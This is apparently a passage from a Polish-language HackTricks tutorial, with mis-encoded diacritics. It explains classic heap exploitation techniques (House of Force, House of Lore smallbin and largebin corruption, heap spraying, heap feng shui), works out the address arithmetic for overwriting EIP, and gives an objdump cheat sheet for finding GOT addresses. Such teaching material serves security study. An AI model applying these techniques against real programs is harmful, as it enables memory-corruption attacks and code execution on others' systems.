W tym przypadku chcemy mieÄ‡ wskaÅºnik do malloc, ktÃ³ry moÅ¼e byÄ‡ modyfikowany przez atakujÄ…cego (np. wskaÅºnik znajduje siÄ™ na stosie podczas moÅ¼liwego przepeÅ‚nienia zmiennej).

W ten sposÃ³b moÅ¼emy sprawiÄ‡, Å¼e ten wskaÅºnik wskazuje dokÄ…dkolwiek. Jednak nie kaÅ¼de miejsce jest waÅ¼ne, rozmiar faÅ‚szywego fragmentu musi byÄ‡ mniejszy niÅ¼ av->max\_fast i bardziej konkretne, rÃ³wny rozmiarowi Å¼Ä…danemu w przyszÅ‚ym wywoÅ‚aniu malloc()+8. Dlatego jeÅ›li wiemy, Å¼e po tym podatnym wskaÅºniku nastÄ™puje wywoÅ‚anie malloc(40), rozmiar faÅ‚szywego fragmentu musi wynosiÄ‡ 48.

Na przykÅ‚ad, jeÅ›li program pyta uÅ¼ytkownika o liczbÄ™, moÅ¼emy wprowadziÄ‡ 48 i skierowaÄ‡ modyfikowalny wskaÅºnik malloc na nastÄ™pne 4 bajty (ktÃ³re mogÄ… naleÅ¼eÄ‡ do EBP, dziÄ™ki czemu 48 pozostaje z tyÅ‚u, jakby to byÅ‚a nagÅ‚Ã³wek size). Ponadto, adres ptr-4+48 musi speÅ‚niaÄ‡ kilka warunkÃ³w (w tym przypadku ptr=EBP), czyli 8 < ptr-4+48 < av->system\_mem.

JeÅ›li to siÄ™ speÅ‚ni, gdy zostanie wywoÅ‚ane kolejne malloc, ktÃ³re powiedzieliÅ›my, Å¼e jest malloc(40), zostanie mu przypisany adres EBP. JeÅ›li atakujÄ…cy moÅ¼e rÃ³wnieÅ¼ kontrolowaÄ‡ to, co jest zapisywane w tym malloc, moÅ¼e nadpisaÄ‡ zarÃ³wno EBP, jak i EIP dowolnym adresem.

Prawdopodobnie dlatego, Å¼e gdy zostanie zwolnione free(), zostanie zapisane, Å¼e w adresie wskazujÄ…cym na EBP stosu znajduje siÄ™ fragment o idealnym rozmiarze dla nowego malloc(), ktÃ³ry chce zarezerwowaÄ‡, wiÄ™c przypisuje mu ten adres.

**The House of Force**

Wymagane jest:

* PrzepeÅ‚nienie fragmentu, ktÃ³re pozwala na nadpisanie wilderness
* WywoÅ‚anie malloc() z rozmiarem zdefiniowanym przez uÅ¼ytkownika
* WywoÅ‚anie malloc(), ktÃ³rych dane mogÄ… byÄ‡ zdefiniowane przez uÅ¼ytkownika

Najpierw nadpisujemy rozmiar fragmentu wilderness bardzo duÅ¼Ä… wartoÅ›ciÄ… (0xffffffff), dziÄ™ki czemu kaÅ¼de Å¼Ä…danie pamiÄ™ci wystarczajÄ…co duÅ¼e bÄ™dzie obsÅ‚ugiwane w \_int\_malloc() bez koniecznoÅ›ci rozszerzania sterty.

NastÄ™pnie zmieniamy av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego, tak jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisaÄ‡ av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim przechwytuje adres bieÅ¼Ä…cego fragmentu wilderness (aktualne av->top), a remainder to dokÅ‚adnie suma tego adresu i liczby bajtÃ³w Å¼Ä…danych przez malloc(). Dlatego jeÅ›li \&EIP-8 znajduje siÄ™ pod adresem 0xbffff224, a av->top zawiera 0x080c2788, to iloÅ›Ä‡, ktÃ³rÄ… musimy zarezerwowaÄ‡ w kontrolowanym malloc, aby av->top wskazywaÅ‚ na $EIP-8 dla nastÄ™pnego malloc(), wynosi:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposÃ³b zostanie zapisana zmieniona wartoÅ›Ä‡ w av->top, a nastÄ™pne malloc wskaÅ¼e na EIP i bÄ™dzie moÅ¼na go nadpisaÄ‡.

WaÅ¼ne jest, aby rozmiar nowego fragmentu wilderness byÅ‚ wiÄ™kszy niÅ¼ Å¼Ä…danie ostatniego malloc(). Innymi sÅ‚owy, jeÅ›li wilderness wskazuje na \&EIP-8, rozmiar zostanie dokÅ‚adnie w polu EBP stosu.

**The House of Lore**

**Korupcja SmallBin**

Uwolnione fragmenty sÄ… umieszczane w bin w zaleÅ¼noÅ›ci od ich rozmiaru. Ale zanim zostanÄ… umieszczone, sÄ… przechowywane w unsorted bins. Gdy fragment zostanie zwolniony, nie jest natychmiast umieszczany w swoim binie, ale pozostaje w unsorted bins. NastÄ™pnie, jeÅ›li zostanie zarezerwowany nowy fragment i poprzedni zwolniony moÅ¼e mu sÅ‚uÅ¼yÄ‡, zostanie mu zwrÃ³cony, ale jeÅ›li zostanie zarezerwowany wiÄ™kszy, zwolniony fragment z unsorted bins zostanie umieszczony w odpowiednim binie.

Aby dotrzeÄ‡ do podatnego kodu, Å¼Ä…danie pamiÄ™ci musi byÄ‡ wiÄ™ksze niÅ¼ av->max\_fast (zazwyczaj 72) i mniejsze niÅ¼ MIN\_LARGE\_SIZE (512).
JeÅ›li w binie znajduje siÄ™ kawaÅ‚ek o odpowiednim rozmiarze, zwracany jest po odÅ‚Ä…czeniu:

bck = victim->bk; WskaÅºnik na poprzedni kawaÅ‚ek, jedyna informacja, ktÃ³rÄ… moÅ¼emy zmieniÄ‡.

bin->bk = bck; Przedostatni kawaÅ‚ek staje siÄ™ ostatnim, jeÅ›li bck wskazuje na stos do nastÄ™pnego zarezerwowanego kawaÅ‚ka, zostanie przypisany ten adres.

bck->fd = bin; Lista jest zamykana, wskazujÄ…c na bin

Wymagane jest:

Zarezerwowanie dwÃ³ch malloc, aby moÅ¼na byÅ‚o przeprowadziÄ‡ przepeÅ‚nienie pierwszego po zwolnieniu drugiego i umieszczeniu go w swoim binie (czyli zarezerwowano malloc wiÄ™kszy niÅ¼ drugi kawaÅ‚ek przed przepeÅ‚nieniem)

Zarezerwowanie malloc, ktÃ³rego adres jest kontrolowany przez atakujÄ…cego.

Celem jest to, Å¼e jeÅ›li moÅ¼emy przeprowadziÄ‡ przepeÅ‚nienie na stercie, ktÃ³ra ma zwolniony kawaÅ‚ek poniÅ¼ej i w swoim binie, moÅ¼emy zmieniÄ‡ wskaÅºnik bk. JeÅ›li zmienimy wskaÅºnik bk i ten kawaÅ‚ek stanie siÄ™ pierwszym na liÅ›cie bin i zostanie zarezerwowany, bin zostanie oszukany i powiemy mu, Å¼e ostatni kawaÅ‚ek na liÅ›cie (nastÄ™pny do zaoferowania) znajduje siÄ™ pod faÅ‚szywym adresem, ktÃ³ry podaliÅ›my (na przykÅ‚ad na stosie lub GOT). W rezultacie, jeÅ›li zostanie ponownie zarezerwowany inny kawaÅ‚ek, a atakujÄ…cy ma uprawnienia do niego, zostanie mu przydzielony kawaÅ‚ek na Å¼Ä…danej pozycji i bÄ™dzie mÃ³gÅ‚ w niÄ… pisaÄ‡.

Po zwolnieniu zmodyfikowanego kawaÅ‚ka konieczne jest zarezerwowanie kawaÅ‚ka wiÄ™kszego od zwolnionego, aby zmodyfikowany kawaÅ‚ek wyszedÅ‚ z nieuporzÄ…dkowanych binÃ³w i zostaÅ‚ umieszczony w swoim binie.

Gdy juÅ¼ znajdzie siÄ™ w swoim binie, naleÅ¼y zmieniÄ‡ mu wskaÅºnik bk za pomocÄ… przepeÅ‚nienia, aby wskazywaÅ‚ na adres, ktÃ³ry chcemy nadpisaÄ‡.

NastÄ™pnie bin musi poczekaÄ‡, aÅ¼ malloc() zostanie wywoÅ‚ane wystarczajÄ…co wiele razy, aby ponownie uÅ¼yÄ‡ zmodyfikowanego bina i oszukaÄ‡ bin, sprawiajÄ…c, Å¼e uwierzy, Å¼e nastÄ™pny kawaÅ‚ek znajduje siÄ™ pod faÅ‚szywym adresem. NastÄ™pnie zostanie przydzielony kawaÅ‚ek, ktÃ³ry nas interesuje.

Aby wykorzystaÄ‡ podatnoÅ›Ä‡ jak najszybciej, idealne jest: zarezerwowanie podatnego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka, ktÃ³ry zostanie zmodyfikowany, zwolnienie tego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka wiÄ™kszego od tego, ktÃ³ry zostanie zmodyfikowany, zmodyfikowanie kawaÅ‚ka (podatnoÅ›Ä‡), zarezerwowanie kawaÅ‚ka o takim samym rozmiarze co naruszony i zarezerwowanie drugiego kawaÅ‚ka o takim samym rozmiarze, ktÃ³ry bÄ™dzie wskazywaÅ‚ na wybrany adres.

Aby zabezpieczyÄ‡ siÄ™ przed tym atakiem, uÅ¼ywa siÄ™ standardowej weryfikacji, czy kawaÅ‚ek "nie" jest faÅ‚szywy: sprawdza siÄ™, czy bck->fd wskazuje na victim. Innymi sÅ‚owy, w naszym przypadku, jeÅ›li wskaÅºnik fd\* faÅ‚szywego kawaÅ‚ka wskazuje na victim na stosie. Aby ominÄ…Ä‡ to zabezpieczenie, atakujÄ…cy musiaÅ‚by byÄ‡ w stanie w jakiÅ› sposÃ³b (prawdopodobnie przez stos) zapisaÄ‡ w odpowiednim miejscu adres victim. W ten sposÃ³b kawaÅ‚ek wydaje siÄ™ byÄ‡ prawdziwy.

**Korupcja LargeBin**

Wymagane sÄ… te same warunki co wczeÅ›niej i kilka dodatkowych, ponadto zarezerwowane kawaÅ‚ki muszÄ… byÄ‡ wiÄ™ksze niÅ¼ 512.

Atak jest podobny do poprzedniego, czyli trzeba zmieniÄ‡ wskaÅºnik bk i wymagane sÄ… wszystkie te wywoÅ‚ania malloc(), ale dodatkowo trzeba zmieniÄ‡ rozmiar zmodyfikowanego kawaÅ‚ka tak, aby ten rozmiar - nb byÅ‚ < MINSIZE.

Na przykÅ‚ad, trzeba ustawiÄ‡ rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie moÅ¼e byÄ‡ ujemne, poniewaÅ¼ porÃ³wnuje siÄ™ liczby bez znaku)

Dodatkowo wprowadzono Å‚atkÄ™, aby sprawiÄ‡, Å¼e atak bÄ™dzie jeszcze trudniejszy.

**Rozpylanie sterty (Heap Spraying)**

Polega na zarezerwowaniu jak najwiÄ™kszej iloÅ›ci pamiÄ™ci dla sterty i wypeÅ‚nieniu jej poduszkÄ… z nops zakoÅ„czonÄ… shellcodem. Dodatkowo jako poduszkÄ™ uÅ¼ywa siÄ™ 0x0c. NastÄ™pnie prÃ³buje siÄ™ skoczyÄ‡ do adresu 0x0c0c0c0c, wiÄ™c jeÅ›li jakaÅ› adres zostanie nadpisany tymi nopsami, skok zostanie wykonany tam. PodstawowÄ… taktykÄ… jest zarezerwowanie jak najwiÄ™kszej iloÅ›ci pamiÄ™ci, aby sprawdziÄ‡, czy jakiÅ› wskaÅºnik zostanie nadpisany, i skok do 0x0c0c0c0c w nadziei, Å¼e tam bÄ™dÄ… nopsy.

**Feng Shui sterty (Heap Feng Shui)**

Polega na ustawieniu pamiÄ™ci poprzez rezerwacje i zwolnienia w taki sposÃ³b, aby miÄ™dzy wolnymi kawaÅ‚kami pozostaÅ‚y zarezerwowane kawaÅ‚ki. Bufor do przepeÅ‚nienia zostanie umieszczony w jednym z tych kawaÅ‚kÃ³w.

**objdump -d executable** â€”> RozkÅ‚ada funkcje\
**objdump -d ./PROGRAMA | grep FUNCTION** â€”> Pobiera adres funkcji\
**objdump -d -Mintel ./shellcodeout** â€”> Aby sprawdziÄ‡, czy to na pewno nasz shellcode i uzyskaÄ‡ kody operacyjne\
**objdump -t ./exec | grep varBss** â€”> Tabela symboli, aby uzyskaÄ‡ adresy zmiennych i funkcji\
**objdump -TR ./exec | grep exit(func lib)** â€”> Aby uzyskaÄ‡ adresy funkcji biblioteki (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> WyÅ›wietla adres puts do nadpisania w GOT\
**objdump -D ./exec** â€”> RozkÅ‚ada WSZYSTKO aÅ¼ do wpisÃ³w plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Informacje o funkcji w gdb

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
